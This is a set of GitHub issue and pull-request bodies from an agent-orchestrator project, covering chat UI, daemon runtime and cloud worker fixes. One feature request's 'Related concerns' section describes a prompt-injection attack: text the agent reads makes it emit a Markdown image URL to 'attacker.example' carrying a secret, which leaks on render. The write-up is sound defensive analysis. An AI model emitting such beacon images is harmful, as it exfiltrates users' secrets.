- Identify the current dominant server-error fingerprints using request IDs and Sentry.
- Return stable typed errors for known non-sendable session states.
- Preserve a distinct result for uncertain delivery and prevent blind duplicate retries.
- Record the stable error code, app version, session mode, and coarse runtime state without message content.
- Add regression coverage for each confirmed cause.
- Verify that HTTP 500 events and affected installations fall after rollout.

## Related

- #3963 tracked a closed database-growth cause of intermittent `ao send` failures. This production signal continued after that fix and does not expose enough information to attribute it to the same cause.
- #3221 tracked a closed terminal submission race where the endpoint did not return this 500 symptom.
- #4481 tracks HTTP 500 from the separate session kill route.

title: fix(acp): buffer session/load replay updates off the SDK queue
body:
## What

During ACP `session/load`, buffer replayed notifications in an in-memory inbox and normalize them after the load response returns, instead of running full ACP→AO normalization inline on the SDK's notification delivery path.

## Why

Fixes #5371

The ACP SDK delivers notifications sequentially through a bounded queue (capacity 1024) and hard-closes the connection on overflow. AO normalized every replayed update inside the handler, so a long transcript could not drain fast enough: the queue filled, the connection closed, and the in-flight `session/load` failed with `peer disconnected before response`, leaving the chat unresumable. Reporter's daemon log:

```
ERROR msg="failed to queue notification; closing connection" err="notification queue overflow" capacity=1024 queued=1024
INFO  msg="connection closed" cause="notification queue overflow"
POST /api/v1/sessions/montamer2-2/resume-agent → 500 "ACP session/load: ... peer disconnected before response"
```

## How

- `SessionUpdate` captures replay notifications verbatim (`captureReplayUpdate`) and returns immediately; normalization runs in the new `drainAndFinishReplay` after the `session/load` response watermark.
- Capture stays active until the final drain. The empty-inbox check, final turn settlement, and the switch to live delivery happen under the same lock, so updates racing the watermark stay ordered and none can be captured after the drain or delivered live early.
- Normalization batches never hold the inbox lock, so SDK delivery keeps making progress. Handler-error semantics are unchanged: the SDK treats notification-handler errors as log-only, and the drain logs them the same way.

### Intentional omissions / limits

- Protects the **replay path only**. A live burst that outpaces normalization can still overflow the same queue; that is a separate change.
- The inbox is an unbounded in-memory backlog (entries are dropped as they are processed, so peak is roughly raw + normalized history). In practice it is bounded by the provider transcript.
- Normalization still runs inside the existing 60 s `handshakeTimeout` resume context, now after the load response; a pathological transcript could still exceed it. Not a regression — the inline path shared the same budget.
- Does not change replay/live boundary semantics, history pruning, or compaction, and is unrelated to #5292 (provider-side `-32603` on Claude Code refresh) and to #5255/#4466 (history trust/branch handling).

## Testing

- **Mutation check:** with inline normalization restored, the new `TestACPReplayLoadLargeHistoryThroughSDK` fails with the reporter's exact error (`failed to queue notification … capacity=1024 queued=1024` → `peer disconnected before response`); with this change it passes (8,192 notifications, ~20 MiB of text, through the real SDK over in-memory pipes).
- **Real transcript:** an isolated copy of the affected OpenCode session, resumed through the real ACP driver on the reporter's machine, imported 4,603 events, and a refresh preserved every event identity. Local validation artifact, not committed as a fixture.
- `go test -race -timeout=15m ./...` (the CI gate): all 169 packages ok. `go test -tags e2e ./internal/cli/...`: ok.
- `npm run lint` (golangci-lint v2.12.2): 0 issues; `gofmt -l .`, `go build ./...`, `go vet ./...` clean. No API drift.
- No docs updates required: no daemon API, storage, CLI, or hard-rule change (`docs/documentation-map.md`).

## Checklist

- [x] Branched from `main` (or continuing an existing PR branch)
- [x] One focused change; links the related issue when applicable
- [x] Follows [AGENTS.md](https://github.com/Untrivial-ai/agent-orchestrator/blob/main/AGENTS.md) conventions and PR hygiene
- [x] Tests added/updated for user-visible behavior where it makes sense
- [ ] Relevant CI checks pass for the area touched (`go`, frontend, etc.)

title: fix(chat): stop skills catalog polling flood on controller conflict
body:
## What

The Chat skills catalog (`useConversationSkills`) polled `GET /api/v1/sessions/{id}/conversation/skills` on a fixed 60s interval. When the live Chat controller does not own the session, the daemon answers `409 CHAT_CONTROLLER_NOT_READY`. A cached "ready" snapshot can outlive the controller (a restart or interface switch), so the query stays enabled and re-requests the catalog every minute for as long as the surface is mounted, turning one readiness conflict into a steady stream of 409s.

This makes `refetchInterval` back off when the last fetch failed with `CHAT_CONTROLLER_NOT_READY`: the fast poll stops while that conflict stands. Readiness returning re-enables the query through the existing controller-gated `enabled` flag, or invalidates it on agent-switch settle, which refetches once and resumes polling on success. An empty catalog is still a real answer and keeps polling, so a skill published later becomes visible.

Fixes #5367 (renderer polling half). The 409 flood was 23,254 renderer API-error events across 1,198 installations over 28 days.

## Why this is the right seam

The catalog is already gated on `controllerCatalogsEnabled` in `SessionChatSurface`, which derives readiness from the snapshot. The 409s occur in the race window where the snapshot still reports `ready`/`busy` but the daemon controller is momentarily gone. Backing the poll off on the typed 409 closes that window without changing the readiness model, and recovery is already driven by the enabled-gate and the switch-settle invalidation (`invalidateConversationProviderCatalogs`).

## Tests

`frontend/src/renderer/hooks/useConversation.test.tsx`:
- stops polling while the controller answers 409 (one request, no repeats after 5 minutes of fake time)
- keeps polling once the catalog loads (empty catalog still refetches on the interval)

Ran locally: `npx vitest run src/renderer/hooks/useConversation.test.tsx` (42 passed) and `npm run typecheck`.

## Out of scope (tracked in the issue, not attempted here)

The issue also asks for a degraded/retryable composer state distinct from "no skills installed", a renderer telemetry error code for this route, and PostHog verification of the post-rollout 409 rate. Those are follow-ups; this PR is the contained renderer change that removes the per-minute 409 flood.

title: fix(chat): show repo-qualified path in turn changed-files card
body:
## What

Each row in a turn's changed-files card (`TurnChangedFiles`) showed only the file basename. In a workspace with more than one repository, two files with the same name in different repos (`workspace-test.txt` in both `alpha` and `beta`) both render as the same bare filename, and the row's on-screen label no longer matches the repository-qualified path the Files inspector opens when you click it.

This shows the same workspace-relative path the row already opens: `openPath`, computed by `turnFileOpenPath(file.path, pathHints)` and already passed to `onOpenFile` and the `Open ... in Files` aria-label. Both render branches (the clickable row and the read-only row) now display `openPath` instead of `fileBasename(file.path)`.

Fixes #5366.

## Why this is the right seam

The daemon stores the provider's repo-relative path verbatim (`backend/internal/service/chat/controller.go`, `Path: file.Path`), so the diff row's `file.path` carries no repository qualifier. That qualifier is reconstructed on the client from the turn's absolute `file_change` paths and command cwd (`turnFileOpenPath` / `turnPathHints`), which is exactly the value the row already opens. Displaying `openPath` makes the label and the click target the same string, so a row can never name one file and open another. When there are no hints (single repo, no reconstruction possible), `openPath` is the unchanged repo-relative path, so single-repo rows are unaffected.

## Tests

`frontend/src/renderer/components/chat/TurnChangedFiles.test.tsx`:

title: fix(runtime): answer terminal capability queries in the detached pty host
body:
## Problem

TUI sessions that run without an attached client had no terminal to answer them. The detached pty-host (`ptyhost-v1:`) pumps PTY bytes and answers nothing, while tmux — the other runtime — is a terminal emulator and answers.

Muse Code 1.2.1's TUI sends `CSI 6n` (cursor position) before its first draw and waits for the reply. With nothing answering it blocks and then exits **0** having painted nothing: the session reports `exited`, no native session id is emitted, and nothing in AO says why. Every orchestrator-spawned Muse worker failed this way; opening a pane quickly enough hid it, which is what made it look like "Muse won't launch".

## Fix

`terminalQueryResponder` in the pty-host answers the startup queries a TUI waits on:

- `CSI 6n` cursor position · `CSI 5n` device status · `CSI c` / `CSI >c` device attributes · `CSI ?u` kitty keyboard flags

…and **only while no client is attached**. An attached client is a real emulator and answers for itself (xterm.js 5.5 handles DA1/DA2 and DSR 6 — verified in its source), and answering from both sides would deliver two cursor reports for one query, which is the classic phantom-keystroke bug in full-screen apps.

Colour reports (`OSC 4/10/11`) are deliberately left alone: they describe the *viewer*, not the host, so fabricating them would repaint a light-themed pane with a dark theme's palette, and an unanswered colour report only makes an app fall back to its own defaults. Isolation testing showed they are not needed to unblock: answering only `CSI 6n` brings Muse up.

Replies are written by a dedicated bounded writer goroutine, so a PTY that stops accepting input cannot stall the output pump. Fragments are carried across reads, so a sequence split between two PTY reads is answered on the read that completes it.

## Verification

Muse Code 1.2.1, **no client attached at any point**:

| | before | after |
| --- | --- | --- |
| child process | exited 0 after ~8 s | alive > 20 s |
| host status | `{"alive":false,"exitCode":0}` | `{"alive":true}` |
| output | 275 bytes, nothing painted | 100 KB+, `Muse Code 1.2.1` rendered, turn completes |

End to end through a daemon built from this branch: a Muse worker spawned over the API stays `idle`, `POST /api/v1/sessions/{id}/send` returns 200 (before, the guard refused it with `ErrAgentExited`), and Muse answers the delivered message.

Tests: `query_test.go` covers each query, sequences split across reads, non-queries left untouched and repeated queries; `host_test.go` covers answering while unattached, deferring to an attached client, and resuming after detach. `go test ./...` and `golangci-lint v2.12.2` are clean.

## Notes

- Follow-up, not in this PR: Muse's screen-derived idle detector still expects a composer line exactly `⟩` while Muse 1.2.1 draws `❯`, so screen-proven idle (and with it TUI→Chat handoff) stays dark for Muse and state rides on its hooks, which do fire.
- This is a runtime fix, so it reaches users in a daemon build; the packaged binary in an installed app is unaffected until then.

title: fix(cloud): PAT-first PR tracking, and block agent launch on checkout
body:
## Summary
Two confirmed, separate bugs found while diagnosing cloud worker failures reported against this deployment:

**1. PR tracking failed with `SCM_BROKER_UNAVAILABLE` even with a valid PAT configured**
`workerRaisePullRequest` and `workerClaimPullRequest` (`cloud/internal/httpapi/worker_handlers.go`) gated the entire handler on `s.checkoutBroker == nil` *before* ever attempting the configured user PAT — unlike their sibling `workerCheckoutGrant`/`workerPushGrant`, which correctly try the PAT first and only fall back to (or fail without) the broker. Their own inline comments ("PAT-first, mirroring...") described behavior the code didn't actually implement. On a deployment with no GitHub App configured (`checkoutBroker` stays `nil`), PR raise/claim — and by extension `ao claim-pr`, auto-invoked by the worker's `gh pr create` wrapper — always failed with a 503, regardless of PAT. Reordered both handlers to match the working PAT-first pattern.

**2. Fresh worker sandboxes could start their first turn against an empty, uncloned workspace**
`ao-worker/main.go` ran `prepareWorkspace` (git checkout) and `startInteractiveAgent` (the coding-agent process) in independent, unsynchronized goroutines. `HoldAgentInputUntilWorkspaceReady` was meant to prevent this, but it only holds *terminal input* for turns after the first — the session's initial prompt is baked directly into the agent's launch command (`BuildInteractive` → `agentruntime.BuildLaunchCommand`), so it never passed through that hold. A failed or slow checkout let the agent boot and start working in an empty workspace, with the checkout failure logged only worker-side and invisible to the session/user. Reproduced twice against this deployment. `startInteractiveAgent` now blocks on the checkout goroutine's result before building or launching the agent command.

## Test plan
- [x] `go build ./...` (cloud module)
- [x] `go vet ./...` (cloud module)
- [x] `go test ./...` (cloud module) — all packages pass
- [x] New tests in `worker_pat_write_test.go` reproduce the exact reported bug: PAT works with `checkoutBroker == nil` (previously would 503); no-PAT/no-broker fails closed with `SCM_BROKER_UNAVAILABLE` instead of panicking, for both raise and claim

title: Mobile chat doesn't show images attached from the desktop chat
body:
## Observed

An image pasted into a Chat session on the desktop app is not visible when the same conversation is opened in the mobile app.

## Expected

The mobile timeline shows the image the human attached, like the desktop timeline does.

## Analysis (agent-collected, for the fix PR)

- Desktop stages composer images under `.ao/attachments/attachment-<id>.<ext>` and appends `Attached files (read these files in the workspace):` plus the path list to the message. Desktop's `stagedAttachmentParts` strips that suffix and renders each image from `/api/v1/sessions/<id>/preview/files/<path>`.
- Mobile's `ChatTimeline` renders the human message `text` verbatim, so the user sees the raw path list and no image. Steered messages behave the same way.
- Mobile writes a different suffix (`Attached files are available in the worktree:`) that desktop's parser does not recognize, so images attached from mobile also show as raw paths on desktop.
- The daemon already serves staged attachments on that route over the LAN listener with the Bearer password, so no backend change is required.

title: [Feature]: Show chat images as thumbnails that open full size
body:
### Problem

When an agent puts a Markdown image in a chat reply (`![screenshot](...)`), the desktop chat renders it with nothing but `max-w-full` (the `img` override in `frontend/src/renderer/components/chat/ChatMarkdown.tsx`). A screenshot fills the whole conversation column at its natural height, a few images in a row turn into a very long scroll, and clicking an image does nothing, so a detailed screenshot cannot be viewed larger. Images attached to a human message (`StagedAttachmentItems` in `ChatTimelineItems.tsx`, capped at `max-h-80`) already read much tidier than images the agent sends back.

This affects anyone using agents that report visual results (UI screenshots, charts, diagrams) in chat.

### Proposed direction

Show chat images the way chat apps such as the Claude app do:

- **One image:** a height-capped preview, sized like human-message attachments (`max-h-80`, `object-contain`).
- **Several images:** a paragraph made only of images (`![a](u1) ![b](u2)`, or one per line) becomes a wrapping row of equal-height thumbnails. Images mixed into a sentence stay inline in that sentence.
- **Click to enlarge:** opens the image in the existing `components/ui/dialog.tsx`, at the largest size that fits the window; Escape or the close button dismisses it.
- **Load failure:** falls back to the alt text, as `components/markdown/MarkdownImage.tsx` already does in the file viewer.
- Out of scope: arrow-key navigation between images of a gallery inside the dialog.

### Alternatives considered

Opening the image URL in the AO Browser panel instead. That leaves the conversation and does not fix the in-line size problem.

### Related concerns (not part of this change)

1. **External image beacons from chat Markdown.** The renderer CSP in `frontend/vite.renderer.config.ts` is `img-src 'self' data: http://127.0.0.1:* https:`; the `https:` exception exists for repository avatars on self-hosted SCM. As a result, any `https://` image in chat Markdown loads as soon as the reply renders. If a prompt injection (for example in a file or web page the agent reads) makes the agent emit `![](https://attacker.example/?q=<secret>)`, rendering the reply sends that request, with no click needed. This is an exfiltration channel. One option is to allow only workspace, loopback, and `data:` sources for chat Markdown images at the component level, and show anything else as alt text or a click-to-load placeholder, while keeping the CSP exception for avatars. Separately, the doc comment in `MarkdownImage.tsx` still says the CSP allows images only from self, `data:`, and loopback, which no longer matches the policy.
2. **ACP image content blocks are dropped.** `contentText` in `backend/internal/adapters/chatdriver/acp/client.go` returns only `content.Text`, so image content blocks from ACP agents, including images in tool results, never reach the chat. This probably deserves its own issue.

### Before submitting

- [x] I searched existing issues / discussions for something similar
- [x] I am willing to help implement this if maintainers agree on scope

title: [Feature]: Resolve worktree-relative image paths in chat Markdown
body:
### Problem

To show a workspace file as an image in the desktop chat today, an agent has to write the full daemon URL, for example:

```markdown
![](http://127.0.0.1:3001/api/v1/sessions/<session-id>/preview/files/docs/screenshot.png)
```

That has three problems:

- The agent needs to know the daemon port and its own session id.
- The URL is baked into the stored transcript, so when the daemon port changes, every image in past conversations breaks.
- The natural thing to write, a worktree-relative path like `![](docs/screenshot.png)`, renders as a broken image because the chat renderer has nothing to resolve it against.

This affects anyone whose agents report screenshots, charts, or generated diagrams saved in the worktree.

### Proposed direction

Resolve relative image paths in chat Markdown against the session's worktree, reusing what the file viewer already does for `.md` files:

- `frontend/src/renderer/lib/markdown-image-resolver.ts` (`resolveMarkdownImageSrc` / `buildWorkspaceBlobUrl`, used by `components/markdown/MarkdownImage.tsx`) turns a relative `src` into `GET /api/v1/sessions/{sessionId}/workspace/file/blob?path=...`. The daemon rejects paths that escape the session workspace (`INVALID_WORKSPACE_PATH`), and the resolver clamps `..` at the root.
- `ChatMarkdown` has no session id today. Supply it through a small context, the same pattern as the existing `ChatLinkProvider`, from `ChatWorkspace`.
- Relative paths resolve from the worktree root, since a chat message has no file of its own to be relative to.
- Absolute sources (`https:`, `data:`, root-relative `/...`, and existing loopback URLs) keep today's behaviour, so existing transcripts render the same.

Because the URL is built at render time, the port lives only in the renderer's current API base URL, and old conversations keep working after a port change.

### Security notes

- Relative resolution only reaches the daemon's loopback blob route, which is confined to the session workspace. An agent can already read these files, so this does not expose anything new to the agent. It does let an agent display any image in its own worktree in chat, which is the intent.
- The larger risk is unchanged by this proposal and is described in #5381: the renderer CSP allows `img-src https:`, so an absolute external image in chat Markdown loads on render and can act as an exfiltration beacon under prompt injection. Keeping absolute URLs as they are here means that concern still needs its own fix.

### Alternatives considered

- Keep writing absolute daemon URLs. This breaks on port changes and leaks implementation details into prompts.
- Rewrite image URLs in the daemon when storing messages. This changes the stored record, which `ChatMarkdown` deliberately renders verbatim, and still bakes in a port.

### Before submitting

- [x] I searched existing issues / discussions for something similar
- [x] I am willing to help implement this if maintainers agree on scope

## Desktop acceptance

- launched the real Electron desktop from this branch with isolated data at `/tmp/ao335-desktop/data`, run file `/tmp/ao335-desktop/running.json`, daemon `127.0.0.1:3012`, and renderer `http://localhost:5173`
- loaded a seeded orchestrator project and received `GET /api/v1/projects/summary-demo/summary` with HTTP 200
- confirmed the Summary projection consumed report-derived worker facts without exposing a public Meaningful Outputs section

## Invocation verification

- Codex 0.154.0 completed the noninteractive output probe successfully
- Claude accepted the print-mode invocation and returned the expected local organization authentication error, which the summary service surfaces while retaining the last good narrative

## Integration boundary

This branch contains Reports PR #5064 exact reconciled head `f063ecc750f0d7a5884a150d412d8f9a0131d115` as its dependency contract and current `main`. title: bug(chat): transient reconnect errors stay in the timeline after the turn recovers
body:
## Problem

In the Chat UI, transient provider errors stay in the timeline forever. If the agent hits reconnect errors and then recovers, the error rows remain even though the turn went on to complete. The chat ends up telling two opposite stories: a wall of "Reconnecting… 5/5 stream disconnected" rows, followed by the agent working fine.

**Source:** [#bug-triage report](https://discord.com/channels/1476302178913357958/1491735678156013588/1548971829442383903) | **Reported by:** @.phylolver (vaibhaav) | **Analyzed against:** origin/main `70453219a` (local HEAD `aeb923f79`, file unchanged)

![screenshot](https://raw.githubusercontent.com/i-trytoohard/codex-startup-factory/main/.issue-assets/reconnect-stuck-chat/reconnecting-stuck.png)

## Repro

1. Start a Codex chat turn and drop the network (or trigger a provider stream failure).
2. Let the reconnect cycle run: `Reconnecting… 2/5` … `5/5`, then `waiting for network` rows.
3. Restore the network. The turn recovers and keeps working.
4. Every reconnect row is still there, minutes later, with no resolution state.

## Where

Each attempt is persisted as a durable error activity item. `ErrorActivityRow` in `frontend/src/renderer/components/chat/ChatTimelineItems.tsx:1895` (dispatch at `:772`) renders every `activityKind === "error"` item as a permanent timeline row. There is no link between these rows and the later successful turn, so nothing ever collapses or marks them resolved. (File:line refs are per local HEAD `aeb923f79`; the dispatch line shifts by a few at tip.)

## Fix hint

Either collapse consecutive reconnect rows for one turn into a single expandable "connection issues during this turn (resolved)" entry, or dim/annotate them once the turn completes. Decide what the durable record keeps vs. what the timeline shows: the errors are real history, but the display shouldn't read as an unresolved failure.

**Priority:** P2 | **Confidence:** High on the display behavior, Medium on the intended fix shape

title: feat(cli): add ao send steering mode for active Chat UI turns
body:
> *This was generated by AI during triage.*

## Request

Add an explicit steering mode to `ao send` for Chat UI sessions, for example:

```sh
ao send --session <id> --steer --message "Stop the current approach and use this correction."
```

While the agent is working, deliver this as steering input to its active turn through the Chat UI/provider steering path, rather than queueing an ordinary message for a later turn.

## Why

Queued corrections arrive too late. During coordinated work, agents continue following superseded instructions and send stale progress updates because the new instruction is waiting behind their active turn. The orchestrator needs the CLI equivalent of steering a running Chat UI conversation.

The installed `ao send --help` currently exposes only `--session`, `--message`, and `--help`.

## Expected behavior

- An explicit flag selects active-turn steering; preserve ordinary queued-send behavior when omitted.
- Reuse the existing Chat UI steering semantics and supported provider capability rather than implementing terminal keystroke injection.
- An idle Chat session accepts the message as its next normal turn.
- If the provider or session mode cannot steer, return an explicit unsupported result. Do not silently queue and claim it was steered.
- Distinguish daemon acceptance from actual provider delivery. Do not claim an agent read or acted on a message merely because the CLI returned successfully.
- Preserve message attribution and ordering; avoid duplicate delivery or an extra queued turn for the same steering message.
- Verify busy, idle, unsupported-provider, and failure cases with focused tests.

`--steer` is an illustrative name. A flag named only `--no-wait` could describe CLI blocking without changing delivery semantics; the requested capability is steering the running agent.

Related: #3634 documents delayed delivery to busy workers. This issue scopes the explicit CLI-to-Chat-UI steering control. No polling mechanism is requested.

title: [Feature]: Command Code (cmd) as a supported harness
body:
### Problem

As an AO user whose day-to-day coding agent is **Command Code** (`cmd`, https://commandcode.ai), I cannot run it as an AO worker or orchestrator harness. `ao spawn --harness` only accepts the built-in catalog (claude-code, codex, opencode, kimi, pi, muse, …) and I found no way to register a custom CLI, so Command Code sessions can't be supervised on the Kanban, routed CI/review feedback, or spawned by an orchestrator. This affects anyone whose Command Code subscription is their primary model route (it fronts DeepSeek, GLM, GPT, Gemini, Grok and others behind one account).

Command Code already exposes everything a harness integration seems to need:

| Need | Flag |
|---|---|
| headless run | `-p, --print [query]`, `--output-format json` (NDJSON event stream + final result line) |
| bypass permissions | `--yolo` (alias for `--dangerously-skip-permissions`), `--permission-mode standard\|plan\|auto-accept` |
| model / effort | `-m, --model <provider/model>`, `--effort <low\|medium\|high\|max>` |
| resume | `-r, --resume [id]`, `-c, --continue`, `--session <path\|id>`, `--fork-session` |
| worktrees | `-w, --worktree [name]` |
| automation hygiene | `--skip-onboarding`, `--no-auto-update`, `-t, --trust`, `--no-session` |
| MCP | `cmd mcp …` |

Tested with Command Code 1.54.0 on Linux x64, Node 24; AO desktop build `dev` (daemon reports `ao version` = dev).

### Proposed direction

Add `command-code` (binary `cmd`) to the harness catalog with the same shape as the other CLI-driven harnesses: launch `cmd -p --output-format json --yolo -m <model> --effort <effort>` in the session worktree for Chat mode, plain `cmd` in TUI mode, map AO permission modes to `--permission-mode`/`--yolo`, and map the AO model override to `-m`. Readiness check: `cmd status` (prints "Authentication verified" when logged in). `cmd --list-models` returns the model catalog for the model picker.

### Alternatives considered

- Running `cmd` outside AO and pointing AO at the worktree: loses spawn/kanban/review routing entirely.
- Routing the same models through **opencode** (works today for DeepSeek and GLM at max reasoning) — but that bypasses the Command Code subscription and its taste/skills features.
- Related open requests: #5341 (ZCode harness), #4511 (custom orchestrator harness). A generic "custom harness" definition (binary + flag mapping in a config file) would solve this and #5341 at once, if maintainers prefer that over adding CLIs one by one.

### Before submitting

- [x] I searched existing issues / discussions for something similar
- [ ] I am willing to help implement this if maintainers agree on scope
